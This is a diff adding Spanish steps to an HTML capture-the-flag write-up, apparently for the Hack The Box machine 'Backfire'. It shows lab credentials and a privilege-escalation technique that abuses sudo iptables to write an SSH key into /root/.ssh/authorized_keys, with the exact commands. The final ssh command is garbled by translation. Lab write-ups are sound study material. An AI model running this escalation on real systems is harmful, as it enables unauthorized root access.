@@ -509,7 +509,34 @@ burp0_json = {
 r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
 print(r.text)
 </code></pre>
-<p> </p>
-
+<p>Ingrese las credenciales a continuación
+. Nombre de usuario: pfapostol1
+. Contraseña: pfapostol1 </p>
+<p>Ahora podrás iniciar sesión en el sitio web.</p>
+------------------------------------------------------------------
+<p>Navega hasta la opción de terminal y ejecuta sergej, luego ejecuta la misma shell que usamos antes y con esto tendremos acceso</p>
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+<p>Para manetener una concexion establa podemos hacer lo mismo que hicimos anteriormente, creamos una key publica y le damos autorizacion</p>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+<p>Busque los privilegios que tiene la función sudo habilitada. Podemos ver que iptables habilita la función sudo</p>
+<p>Podemos simplemente agregar nuestra clave pública SSH al comentario de la regla de iptables y luego reenviar la regla, incluido el comentario “malicioso”, al archivo authorized_keys.</p>
+<p>Siga los pasos a continuación</p>
+<p>Ejecute el siguiente comando y agregue su clave pública ssh.</p>
+<pre><code>
+sudo /usr/sbin/iptables -A INPUT -i lo -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDb8iqOLah7g3WFUrTDmni9t6dXVX+cDWqi+RLpuBplK kali@kali\n' -j ACCEPT
+</code></pre>
+<p>Guardar en las claves autorizadas</p>
+<pre><code>
+sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
+</code></pre>
+<p>Verifique en iptables si el comando anterior se ejecutó correctamente o no</p>
+<pre><code>
+sudo iptables -S
+</code></pre>
+<p>A continuación, podemos acceder a la raíz de la máquina. Abrimos una nueva terminal y ejecutamos el código siguiente.</p>
+<pre><code>
+ssh - clave raíz @backfire .htb
+</code></pre>
+<p></p>
 </body>
 </html>
